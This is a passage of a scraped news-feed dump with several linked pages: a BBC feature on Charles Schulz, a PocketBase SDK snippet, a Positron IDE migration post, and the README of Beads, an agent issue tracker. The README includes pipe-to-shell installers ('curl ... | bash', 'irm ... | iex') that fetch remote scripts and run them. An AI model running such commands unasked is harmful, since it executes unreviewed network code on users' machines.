    &lt;p&gt;fp8/int8: 100 Tflops&lt;lb/&gt;fp16/int16: 50 Tflops&lt;lb/&gt;fp32/int32: 25 Tflops&lt;lb/&gt;Close to theory efficiency&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://vsora.com/products/jotunn-8/"/><published>2025-11-27T23:30:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46074362</id><title>How Charles M Schulz created Charlie Brown and Snoopy (2024)</title><updated>2025-11-28T11:33:53.921554+00:00</updated><content>&lt;doc fingerprint="2e364174bde00afd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;'You have to just draw something that you hope is funny': How Charles M Schulz created Charlie Brown and Snoopy&lt;/head&gt;
    &lt;p&gt;Charles M Schulz drew his beloved Peanuts strip for 50 years until his announcement on 14 December 1999 that ill health was forcing him to retire. In History looks at how an unassuming cartoonist built a billion-dollar empire out of the lives of a group of children, a dog and a bird.&lt;/p&gt;
    &lt;p&gt;Charles M Schulz's timeless creation Charlie Brown may have been as popular as any character in all of literature, but the cartoonist was modest about the scope of his miniature parables. In a 1977 BBC interview, he said: "I'm talking only about the minor everyday problems in life. Leo Tolstoy dealt with the major problems of the world. I'm only dealing with why we all have the feeling that people don't like us."&lt;/p&gt;
    &lt;p&gt;This did not mean that he felt as if he was dealing with trivial matters. He said: "I'm always very much offended when someone asks me, 'Do I ever do satire on the social condition?' Well, I do it almost every day. And they say, 'Well, do you ever do political things?' I say, 'I do things which are more important than politics. I'm dealing with love and hate and mistrust and fear and insecurity.'"&lt;/p&gt;
    &lt;p&gt;While Charlie Brown may have been the eternal failure, the universal feelings that Schulz channelled helped make Peanuts a global success. Born in 1922, Schulz drew every single Peanuts strip himself from 1950 until his death in February 2000. It was so popular that Nasa named two of the modules in its May 1969 Apollo 10 lunar mission after Charlie Brown and Snoopy. The strip was syndicated in more than 2,600 newspapers worldwide, and inspired films, music and countless items of merchandise.&lt;/p&gt;
    &lt;p&gt;Part of its success, according to the writer Umberto Eco, was that it worked on different levels. He wrote: "Peanuts charms both sophisticated adults and children with equal intensity, as if each reader found there something for himself, and it is always the same thing, to be enjoyed in two different keys. Peanuts is thus a little human comedy for the innocent reader and for the sophisticated."&lt;/p&gt;
    &lt;p&gt;Schulz's initial reason for focusing on children in the strip was strictly commercial. In 1990, he told the BBC: "I always hate to say it, but I drew little kids because this is what sold. I wanted to draw something, I didn't know what it was, but it just seemed as if whenever I drew children, these were the cartoons that editors seemed to like the best. And so, back in 1950, I mailed a batch of cartoons to New York City, to United Features Syndicate, and they said they liked them, and so ever since I've been drawing little kids."&lt;/p&gt;
    &lt;p&gt;IN HISTORY&lt;/p&gt;
    &lt;p&gt;In History is a series which uses the BBC's unique audio and video archive to explore historical events that still resonate today. Subscribe to the accompanying weekly newsletter.&lt;/p&gt;
    &lt;p&gt;Of Snoopy and Charlie Brown, he said: "I've always been a little bit intrigued by the fact that dogs apparently tolerate the actions of the children with whom they are playing. It's almost as if the dogs are smarter than the kids. I think also that the characters I have serve as a good outlet for any idea that I may come up with. I never think of an idea and then find that I have no way of using it. I can use any idea that I think of because I've got the right repertory company."&lt;/p&gt;
    &lt;p&gt;Schulz called upon some of his earliest experiences as a shy child to create the strip. As a teenager, he studied drawing by correspondence course because he was too reticent to attend art school in person. Speaking in 1977, he said: "I couldn't see myself sitting in a room where everyone else in the room could draw much better than I, and this way I was protected by drawing at home and simply mailing my drawings in and having them criticised. I wish I had a better education, but I think that my entire background made me well suited for what I do.&lt;/p&gt;
    &lt;p&gt;"If I could write better than I can, perhaps I would have tried to become a novelist, and I might have become a failure. If I could draw better than I can, I might have tried to become an illustrator or an artist and would have failed there, but my entire being seems to be just right for being a cartoonist."&lt;/p&gt;
    &lt;head rend="h2"&gt;Never give up&lt;/head&gt;
    &lt;p&gt;Peanuts remained remarkably consistent despite the relentless publishing schedule, and Schulz would not let the expectations of his millions of fans become a distraction. He said: "You have to kind of bend over the drawing board, shut the world out and just draw something that you hope is funny. Cartooning is still drawing funny pictures, whether they're just silly little things or rather meaningful political cartoons, but it's still drawing something funny, and that's all you should think about at that time – keep kind of a light feeling.&lt;/p&gt;
    &lt;p&gt;"I suppose when a composer is composing well, the music is coming faster than he can think of it, and when I have a good idea I can hardly get the words down fast enough. I'm afraid that they will leave me before I get them down on the paper. Sometimes my hand will literally shake with excitement as I'm drawing it because I'm having a good time. Unfortunately, this does not happen every day."&lt;/p&gt;
    &lt;p&gt;More like this:&lt;/p&gt;
    &lt;p&gt;• Julie Andrews on being 'teased' for Mary Poppins&lt;/p&gt;
    &lt;p&gt;Despite his modesty, Schulz insisted he was always confident that Peanuts would be a hit. He said: "I mean, when you sign up to play at Wimbledon, you expect to win. Obviously, there are a lot of things that I didn't anticipate, like Snoopy's going to the Moon and things like that, but I always had hopes it would become big."&lt;/p&gt;
    &lt;p&gt;Schulz generally worked five weeks in advance. On 14 December 1999, fans were dismayed to learn that he would be hanging up his pen because he had cancer. He said that his cartoon for 3 January 2000 would be the final daily release. It would be followed on 13 February with the final strip for a Sunday newspaper. He died one day before that last strip ran.&lt;/p&gt;
    &lt;p&gt;In it, Schulz wrote: "I have been grateful over the years for the loyalty of our editors and the wonderful support and love expressed to me by fans of the comic strip. Charlie Brown, Snoopy, Linus, Lucy... how can I ever forget them..."&lt;/p&gt;
    &lt;p&gt;Back in 1977, Schulz insisted that the cartoonist's role was mostly to point out problems rather than trying to solve them, but there was one lesson that people could take from his work. He said: "I suppose one of the solutions is, as Charlie Brown, just to keep on trying. He never gives up. And if anybody should give up, he should."&lt;/p&gt;
    &lt;p&gt;--&lt;/p&gt;
    &lt;p&gt;For more stories and never-before-published radio scripts to your inbox, sign up to the In History newsletter, while The Essential List delivers a handpicked selection of features and insights twice a week.&lt;/p&gt;
    &lt;p&gt;For more Culture stories from the BBC, follow us on Facebook, X and Instagram.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.bbc.com/culture/article/20241205-how-charles-m-schulz-created-charlie-brown-and-snoopy"/><published>2025-11-28T00:10:38+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075219</id><title>Shor's algorithm: the one quantum algo that ends RSA/ECC tomorrow</title><updated>2025-11-28T11:33:53.776339+00:00</updated><content/><link href="https://blog.ellipticc.com/posts/what-is-shors-algorithm-and-why-its-the-single-biggest-threat-to-classical-cryptography/"/><published>2025-11-28T03:19:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075320</id><title>Pocketbase – open-source realtime back end in 1 file</title><updated>2025-11-28T11:33:52.814192+00:00</updated><content>&lt;doc fingerprint="91362922a55dae74"&gt;
  &lt;main&gt;
    &lt;code&gt;// JavaScript SDK
import PocketBase from 'pocketbase';

const pb = new PocketBase('http://127.0.0.1:8090');

...

// list and search for 'example' collection records
const list = await pb.collection('example').getList(1, 100, {
    filter: 'title != "" &amp;amp;&amp;amp; created &amp;gt; "2022-08-01"',
    sort: '-created,title',
});

// or fetch a single 'example' collection record
const record = await pb.collection('example').getOne('RECORD_ID');

// delete a single 'example' collection record
await pb.collection('example').delete('RECORD_ID');

// create a new 'example' collection record
const newRecord = await pb.collection('example').create({
    title: 'Lorem ipsum dolor sit amet',
});

// subscribe to changes in any record from the 'example' collection
pb.collection('example').subscribe('*', function (e) {
    console.log(e.record);
});

// stop listening for changes in the 'example' collection
pb.collection('example').unsubscribe();&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://pocketbase.io/"/><published>2025-11-28T03:45:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075462</id><title>Migrating to Positron, a next-generation data science IDE for Python and R</title><updated>2025-11-28T11:33:52.640059+00:00</updated><content>&lt;doc fingerprint="8daf6973e9b8e2c9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Guides for migrating to Positron&lt;/head&gt;
    &lt;p&gt;Since Positron was released from beta, we’ve been working hard to create documentation that could help you, whether you are curious about the IDE or interested in switching. We’ve released two migration guides to help you on your journey, which you can find linked below.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migrating to Positron from VS Code&lt;/head&gt;
    &lt;p&gt;Positron is a next-generation IDE for data science, built by Posit PBC. It’s built on Code OSS, the open-source core of Visual Studio Code, which means that many of the features and keyboard shortcuts you’re familiar with are already in place.&lt;/p&gt;
    &lt;p&gt;However, Positron is specifically designed for data work and includes integrated tools that aren’t available in VS Code by default. These include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A built-in data explorer: This feature gives you a spreadsheet-style view of your dataframes, making it easy to inspect, sort, and filter data.&lt;/item&gt;
      &lt;item&gt;An interactive console and variables pane: Positron lets you execute code interactively and view the variables and objects in your session, similar to a traditional data science IDE.&lt;/item&gt;
      &lt;item&gt;AI assistance: Positron Assistant is a powerful AI tool for data science that can generate and refine code, debug issues, and guide you through exploratory data analysis.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See the VS Code migration guide here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migrating to Positron from RStudio&lt;/head&gt;
    &lt;p&gt;We anticipate many RStudio users will be curious about Positron. When building Positron, we strived to create a familiar interface while adding extensibility and new features, as well as native support for multiple languages. Positron is designed for data scientists and analysts who work with both R and Python and want a flexible, modern, and powerful IDE.&lt;/p&gt;
    &lt;p&gt;Key features for RStudio users include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Native multi-language support: Positron is a polyglot IDE, designed from the ground up to support both R and Python seamlessly.&lt;/item&gt;
      &lt;item&gt;Familiar interface: We designed Positron with a layout similar to RStudio, so you’ll feel right at home with the editor, console, and file panes. We also offer an option to use your familiar RStudio keyboard shortcuts.&lt;/item&gt;
      &lt;item&gt;Extensibility: Because Positron is built on Code OSS, you can use thousands of extensions from the Open VSX marketplace to customize your IDE and workflow.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See the RStudio migration guide here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migration walkthroughs in Positron&lt;/head&gt;
    &lt;p&gt;Also, check out our migration walkthroughs in Positron itself; find them by searching “Welcome: Open Walkthrough” in the Command Palette (hit the shortcut Cmd + Shift + P to open the Command Palette), or on the Welcome page when you open Positron:&lt;/p&gt;
    &lt;head rend="h2"&gt;What’s next&lt;/head&gt;
    &lt;p&gt;We’re committed to making your transition as smooth as possible, and we’ll be continuing to add to these migration guides. Look out for guides for Jupyter users and more!&lt;/p&gt;
    &lt;p&gt;We’d love to hear from you. What other guides would you like to see? What features would make your transition easier? Join the conversation in our GitHub Discussions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://posit.co/blog/positron-migration-guides"/><published>2025-11-28T04:15:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075616</id><title>Beads – A memory upgrade for your coding agent</title><updated>2025-11-28T11:33:51.872937+00:00</updated><content>&lt;doc fingerprint="2410fd5a88a3a19b"&gt;
  &lt;main&gt;
    &lt;p&gt;Give your coding agent a memory upgrade&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Hash-based IDs eliminate merge conflicts and collision issues!&lt;/p&gt;&lt;p&gt;Previous versions used sequential IDs (bd-1, bd-2, bd-3...) which caused frequent collisions when multiple agents or branches created issues concurrently. Version 0.20.1 switches to hash-based IDs (bd-a1b2, bd-f14c, bd-3e7a...) that are collision-resistant and merge-friendly.&lt;/p&gt;&lt;p&gt;What's new: ✅ Multi-clone, multi-branch, multi-agent workflows now work reliably&lt;/p&gt;&lt;lb/&gt;What changed: Issue IDs are now short hashes instead of sequential numbers&lt;lb/&gt;Migration: Run&lt;code&gt;bd migrate&lt;/code&gt;to upgrade existing databases (optional - old DBs still work)&lt;p&gt;Hash IDs use progressive length scaling (4/5/6 characters) with birthday paradox math to keep collisions extremely rare while maintaining human readability. See "Hash-Based Issue IDs" section below for details.&lt;/p&gt;&lt;/quote&gt;
    &lt;quote&gt;&lt;g-emoji&gt;⚠️&lt;/g-emoji&gt;Alpha Status: This project is in active development. The core features work well, but expect API changes before 1.0. Use for development/internal projects first.&lt;/quote&gt;
    &lt;p&gt;Beads is a lightweight memory system for coding agents, using a graph-based issue tracker. Four kinds of dependencies work to chain your issues together like beads, making them easy for agents to follow for long distances, and reliably perform complex task streams in the right order.&lt;/p&gt;
    &lt;p&gt;Drop Beads into any project where you're using a coding agent, and you'll enjoy an instant upgrade in organization, focus, and your agent's ability to handle long-horizon tasks over multiple compaction sessions. Your agents will use issue tracking with proper epics, rather than creating a swamp of rotten half-implemented markdown plans.&lt;/p&gt;
    &lt;p&gt;Instant start:&lt;/p&gt;
    &lt;code&gt;curl -fsSL https://raw.githubusercontent.com/steveyegge/beads/main/scripts/install.sh | bash&lt;/code&gt;
    &lt;p&gt;Then tell your coding agent to start using the &lt;code&gt;bd&lt;/code&gt; tool instead of markdown for all new work, somewhere in your &lt;code&gt;AGENTS.md&lt;/code&gt; or &lt;code&gt;CLAUDE.md&lt;/code&gt;. That's all there is to it!&lt;/p&gt;
    &lt;p&gt;You don't use Beads directly as a human. Your coding agent will file and manage issues on your behalf. They'll file things they notice automatically, and you can ask them at any time to add or update issues for you.&lt;/p&gt;
    &lt;p&gt;Beads gives agents unprecedented long-term planning capability, solving their amnesia when dealing with complex nested plans. They can trivially query the ready work, orient themselves, and land on their feet as soon as they boot up.&lt;/p&gt;
    &lt;p&gt;Agents using Beads will no longer silently pass over problems they notice due to lack of context space -- instead, they will automatically file issues for newly-discovered work as they go. No more lost work, ever.&lt;/p&gt;
    &lt;p&gt;Beads issues are backed by git, but through a clever design it manages to act like a managed, centrally hosted SQL database shared by all of the agents working on a project (repo), even across machines.&lt;/p&gt;
    &lt;p&gt;Beads even improves work auditability. The issue tracker has a sophisticated audit trail, which agents can use to reconstruct complex operations that may have spanned multiple sessions.&lt;/p&gt;
    &lt;p&gt;Agents report that they enjoy working with Beads, and they will use it spontaneously for both recording new work and reasoning about your project in novel ways. Whether you are a human or an AI, Beads lets you have more fun and less stress with agentic coding.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;✨ Zero setup - &lt;code&gt;bd init&lt;/code&gt;creates project-local database (and your agent will do it)&lt;/item&gt;
      &lt;item&gt;🔗 Dependency tracking - Four dependency types (blocks, related, parent-child, discovered-from)&lt;/item&gt;
      &lt;item&gt;📋 Ready work detection - Automatically finds issues with no open blockers&lt;/item&gt;
      &lt;item&gt;🤖 Agent-friendly - &lt;code&gt;--json&lt;/code&gt;flags for programmatic integration&lt;/item&gt;
      &lt;item&gt;📦 Git-versioned - JSONL records stored in git, synced across machines&lt;/item&gt;
      &lt;item&gt;🌍 Distributed by design - Agents on multiple machines share one logical database via git&lt;/item&gt;
      &lt;item&gt;🚀 Optional Agent Mail - Real-time multi-agent coordination (&amp;lt;100ms vs 2-5s git sync, 98.5% reduction in git traffic)&lt;/item&gt;
      &lt;item&gt;🔐 Protected branch support - Works with GitHub/GitLab protected branches via separate sync branch&lt;/item&gt;
      &lt;item&gt;🏗️ Extensible - Add your own tables to the SQLite database&lt;/item&gt;
      &lt;item&gt;🔍 Multi-project isolation - Each project gets its own database, auto-discovered by directory&lt;/item&gt;
      &lt;item&gt;🌲 Dependency trees - Visualize full dependency graphs&lt;/item&gt;
      &lt;item&gt;🎨 Beautiful CLI - Colored output for humans, JSON for bots&lt;/item&gt;
      &lt;item&gt;💾 Full audit trail - Every change is logged&lt;/item&gt;
      &lt;item&gt;⚡ High performance - Batch operations for bulk imports (1000 issues in ~950ms)&lt;/item&gt;
      &lt;item&gt;🗜️ Memory decay - Semantic compaction gracefully reduces old closed issues&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Linux users: Beads requires glibc 2.32+ (Ubuntu 22.04+, Debian 11+, RHEL 9+, or equivalent).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;✅ Supported: Ubuntu 22.04+ (Jammy), Debian 11+ (Bullseye), Fedora 34+, RHEL 9+&lt;/item&gt;
      &lt;item&gt;❌ Not supported: Ubuntu 20.04 (glibc 2.31), Debian 10 (glibc 2.28), CentOS 7, RHEL 8&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ubuntu 20.04 users: Standard support ended April 2025. Please upgrade to Ubuntu 22.04+ or build from source:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/steveyegge/beads.git
cd beads
go build -o bd ./cmd/bd&lt;/code&gt;
    &lt;p&gt;macOS/Windows: No special requirements.&lt;/p&gt;
    &lt;p&gt;npm (Node.js environments, Claude Code for Web):&lt;/p&gt;
    &lt;code&gt;npm install -g @beads/bd&lt;/code&gt;
    &lt;p&gt;Quick install (macOS / Linux):&lt;/p&gt;
    &lt;code&gt;curl -fsSL https://raw.githubusercontent.com/steveyegge/beads/main/scripts/install.sh | bash&lt;/code&gt;
    &lt;p&gt;Quick install (Windows - PowerShell):&lt;/p&gt;
    &lt;code&gt;irm https://raw.githubusercontent.com/steveyegge/beads/main/install.ps1 | iex&lt;/code&gt;
    &lt;p&gt;Homebrew (macOS/Linux):&lt;/p&gt;
    &lt;code&gt;brew tap steveyegge/beads
brew install bd&lt;/code&gt;
    &lt;p&gt;For full, platform-specific instructions (Windows, Arch Linux, manual builds, IDE integrations, etc.) see the canonical guide in docs/INSTALLING.md.&lt;/p&gt;
    &lt;p&gt;Claude Code for Web: See npm-package/CLAUDE_CODE_WEB.md for SessionStart hook setup.&lt;/p&gt;
    &lt;p&gt;Beads is designed for AI coding agents to use on your behalf. Setup takes 30 seconds:&lt;/p&gt;
    &lt;p&gt;You run this once (humans only):&lt;/p&gt;
    &lt;code&gt;# In your project root:
bd init

# For OSS contributors (fork workflow):
bd init --contributor

# For team members (branch workflow):
bd init --team

# For protected branches (GitHub/GitLab):
bd init --branch beads-metadata

# bd will:
# - Create .beads/ directory with database
# - Import existing issues from git (if any)
# - Prompt to install git hooks (recommended: say yes)
# - Prompt to configure git merge driver (recommended: say yes)
# - Auto-start daemon for sync

# Then tell your agent about bd:
echo "\nBEFORE ANYTHING ELSE: run 'bd onboard' and follow the instructions" &amp;gt;&amp;gt; AGENTS.md&lt;/code&gt;
    &lt;p&gt;Protected branches? If your &lt;code&gt;main&lt;/code&gt; branch is protected, use &lt;code&gt;bd init --branch beads-metadata&lt;/code&gt; to commit issue updates to a separate branch. See docs/PROTECTED_BRANCHES.md for details.&lt;/p&gt;
    &lt;p&gt;Your agent does the rest: Next time your agent starts, it will:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Run &lt;code&gt;bd onboard&lt;/code&gt;and receive integration instructions&lt;/item&gt;
      &lt;item&gt;Add bd workflow documentation to AGENTS.md&lt;/item&gt;
      &lt;item&gt;Update CLAUDE.md with a note (if present)&lt;/item&gt;
      &lt;item&gt;Remove the bootstrap instruction&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For agents setting up repos: Use &lt;code&gt;bd init --quiet&lt;/code&gt; for non-interactive setup (auto-installs git hooks and merge driver, no prompts).&lt;/p&gt;
    &lt;p&gt;For new repo clones: Run &lt;code&gt;bd init&lt;/code&gt; (or &lt;code&gt;bd init --quiet&lt;/code&gt; for agents) to import existing issues from &lt;code&gt;.beads/issues.jsonl&lt;/code&gt; automatically.&lt;/p&gt;
    &lt;p&gt;Git merge driver: During &lt;code&gt;bd init&lt;/code&gt;, beads configures git to use &lt;code&gt;bd merge&lt;/code&gt; for intelligent JSONL merging. This prevents conflicts when multiple branches modify issues. Skip with &lt;code&gt;--skip-merge-driver&lt;/code&gt; if needed. To configure manually later:&lt;/p&gt;
    &lt;code&gt;git config merge.beads.driver "bd merge %A %O %A %B"
git config merge.beads.name "bd JSONL merge driver"
echo ".beads/beads.jsonl merge=beads" &amp;gt;&amp;gt; .gitattributes&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;bd init&lt;/code&gt; creates these files in your repository:&lt;/p&gt;
    &lt;p&gt;Should be committed to git:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;.gitattributes&lt;/code&gt;- Configures git merge driver for intelligent JSONL merging (critical for team collaboration)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/beads.jsonl&lt;/code&gt;- Issue data in JSONL format (source of truth, synced via git)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/deletions.jsonl&lt;/code&gt;- Deletion manifest for cross-clone propagation (tracks deleted issues)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/config.yaml&lt;/code&gt;- Repository configuration template&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/README.md&lt;/code&gt;- Documentation about beads for repository visitors&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/metadata.json&lt;/code&gt;- Database metadata&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Should be in &lt;code&gt;.gitignore&lt;/code&gt; (local-only):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;.beads/beads.db&lt;/code&gt;- SQLite cache (auto-synced with JSONL)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/beads.db-*&lt;/code&gt;- SQLite journal files&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/bd.sock&lt;/code&gt;/&lt;code&gt;.beads/bd.pipe&lt;/code&gt;- Daemon communication socket&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.beads/.exclusive-lock&lt;/code&gt;- Daemon lock file&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.git/beads-worktrees/&lt;/code&gt;- Git worktrees (only created when using protected branch workflows)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The &lt;code&gt;.gitignore&lt;/code&gt; entries are automatically created inside &lt;code&gt;.beads/.gitignore&lt;/code&gt; by &lt;code&gt;bd init&lt;/code&gt;, but your project's root &lt;code&gt;.gitignore&lt;/code&gt; should also exclude the database and daemon files if you want to keep your git status clean.&lt;/p&gt;
    &lt;p&gt;Using devcontainers? Open the repository in a devcontainer (GitHub Codespaces or VS Code Remote Containers) and bd will be automatically installed with git hooks configured. See .devcontainer/README.md for details.&lt;/p&gt;
    &lt;p&gt;Want to use beads in your local clone without other collaborators seeing any beads-related files? Use stealth mode:&lt;/p&gt;
    &lt;code&gt;bd init --stealth&lt;/code&gt;
    &lt;p&gt;Stealth mode configures:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Global gitignore (&lt;code&gt;~/.config/git/ignore&lt;/code&gt;) - Ignores&lt;code&gt;**/.beads/&lt;/code&gt;and&lt;code&gt;**/.claude/settings.local.json&lt;/code&gt;globally&lt;/item&gt;
      &lt;item&gt;Claude Code settings (&lt;code&gt;.claude/settings.local.json&lt;/code&gt;) - Adds&lt;code&gt;bd onboard&lt;/code&gt;instruction for AI agents&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Perfect for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Personal experimentation with beads&lt;/item&gt;
      &lt;item&gt;Working on repos where not everyone uses beads yet&lt;/item&gt;
      &lt;item&gt;Keeping your issue tracking private while contributing to open source projects&lt;/item&gt;
      &lt;item&gt;AI agents that should use beads without affecting the main repo&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What stays invisible to others:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;No &lt;code&gt;.beads/&lt;/code&gt;directory tracked in git&lt;/item&gt;
      &lt;item&gt;No AGENTS.md or README.md mentions of beads&lt;/item&gt;
      &lt;item&gt;No local &lt;code&gt;.gitattributes&lt;/code&gt;or&lt;code&gt;.gitignore&lt;/code&gt;modifications&lt;/item&gt;
      &lt;item&gt;Your beads database and issues remain local-only&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How it works: The global git configuration handles beads merging automatically, while the global gitignore ensures beads files never get committed to shared repos. Your AI agents get the onboard instruction automatically without exposing beads to other repo collaborators.&lt;/p&gt;
    &lt;p&gt;Most tasks will be created and managed by agents during conversations. You can check on things with:&lt;/p&gt;
    &lt;code&gt;bd list                  # See what's being tracked
bd show &amp;lt;issue-id&amp;gt;       # Review a specific issue
bd ready                 # See what's ready to work on
bd dep tree &amp;lt;issue-id&amp;gt;   # Visualize dependencies&lt;/code&gt;
    &lt;p&gt;Run the interactive guide to learn the full workflow:&lt;/p&gt;
    &lt;code&gt;bd quickstart&lt;/code&gt;
    &lt;p&gt;Quick reference for agent workflows:&lt;/p&gt;
    &lt;code&gt;# Find ready work
bd ready --json | jq '.[0]'

# Create issues during work
bd create "Discovered bug" -t bug -p 0 --json

# Link discovered work back to parent
bd dep add &amp;lt;new-id&amp;gt; &amp;lt;parent-id&amp;gt; --type discovered-from

# Update status
bd update &amp;lt;issue-id&amp;gt; --status in_progress --json

# Complete work
bd close &amp;lt;issue-id&amp;gt; --reason "Implemented" --json&lt;/code&gt;
    &lt;p&gt;Recommendation for project maintainers: Add a session-ending protocol to your project's &lt;code&gt;AGENTS.md&lt;/code&gt; file to ensure agents properly manage issue tracking and sync the database before finishing work.&lt;/p&gt;
    &lt;p&gt;This pattern has proven invaluable for maintaining database hygiene and preventing lost work. Here's what to include (adapt for your workflow):&lt;/p&gt;
    &lt;p&gt;1. File/update issues for remaining work&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Agents should proactively create issues for discovered bugs, TODOs, and follow-up tasks&lt;/item&gt;
      &lt;item&gt;Close completed issues and update status for in-progress work&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;2. Run quality gates (if applicable)&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Tests, linters, builds - only if code changes were made&lt;/item&gt;
      &lt;item&gt;File P0 issues if builds are broken&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;3. Sync the issue tracker carefully&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Work methodically to ensure local and remote issues merge safely&lt;/item&gt;
      &lt;item&gt;Handle git conflicts thoughtfully (sometimes accepting remote and re-importing)&lt;/item&gt;
      &lt;item&gt;Goal: clean reconciliation where no issues are lost&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;4. Verify clean state&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;All changes committed and pushed&lt;/item&gt;
      &lt;item&gt;No untracked files remain&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;5. Choose next work&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Provide a formatted prompt for the next session with context&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See the "Landing the Plane" section in this project's documentation for a complete example you can adapt. The key insight: explicitly reminding agents to maintain issue tracker hygiene prevents the common problem of agents creating issues during work but forgetting to sync them at session end.&lt;/p&gt;
    &lt;p&gt;Here's the crazy part: bd acts like a centralized database, but it's actually distributed via git.&lt;/p&gt;
    &lt;p&gt;When you install bd on any machine with your project repo, you get:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;✅ Full query capabilities (dependencies, ready work, etc.)&lt;/item&gt;
      &lt;item&gt;✅ Fast local operations (&amp;lt;100ms via SQLite)&lt;/item&gt;
      &lt;item&gt;✅ Shared state across all machines (via git)&lt;/item&gt;
      &lt;item&gt;✅ No server, no daemon required, no configuration&lt;/item&gt;
      &lt;item&gt;✅ AI-assisted merge conflict resolution&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How it works: Each machine has a local SQLite cache (&lt;code&gt;.beads/*.db&lt;/code&gt;, gitignored). Source of truth is JSONL (&lt;code&gt;.beads/issues.jsonl&lt;/code&gt;, committed to git). Auto-sync keeps them in sync: SQLite → JSONL after CRUD operations (5-second debounce), JSONL → SQLite when JSONL is newer (e.g., after &lt;code&gt;git pull&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;The result: Agents on your laptop, your desktop, and your coworker's machine all query and update what feels like a single shared database, but it's really just git doing what git does best - syncing text files across machines.&lt;/p&gt;
    &lt;p&gt;No PostgreSQL instance. No MySQL server. No hosted service. Just install bd, clone the repo, and you're connected to the "database."&lt;/p&gt;
    &lt;p&gt;bd automatically syncs your local database with git:&lt;/p&gt;
    &lt;p&gt;Making changes (auto-export):&lt;/p&gt;
    &lt;code&gt;bd create "Fix bug" -p 1
bd update bd-a1b2 --status in_progress
# bd automatically exports to .beads/issues.jsonl after 5 seconds

git add .beads/issues.jsonl
git commit -m "Working on bd-a1b2"
git push&lt;/code&gt;
    &lt;p&gt;Pulling changes (auto-import):&lt;/p&gt;
    &lt;code&gt;git pull
# bd automatically detects JSONL is newer and imports on next command

bd ready  # Fresh data from git!
bd list   # Shows issues from other machines&lt;/code&gt;
    &lt;p&gt;Manual sync (optional):&lt;/p&gt;
    &lt;code&gt;bd sync  # Immediately flush pending changes and import latest JSONL&lt;/code&gt;
    &lt;p&gt;For zero-lag sync, install the git hooks:&lt;/p&gt;
    &lt;code&gt;cd examples/git-hooks &amp;amp;&amp;amp; ./install.sh&lt;/code&gt;
    &lt;p&gt;This adds:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;pre-commit - Immediate flush before commit (no 5-second wait)&lt;/item&gt;
      &lt;item&gt;post-merge - Guaranteed import after &lt;code&gt;git pull&lt;/code&gt;or&lt;code&gt;git merge&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Disable auto-sync if needed:&lt;/p&gt;
    &lt;code&gt;bd --no-auto-flush create "Issue"   # Skip auto-export
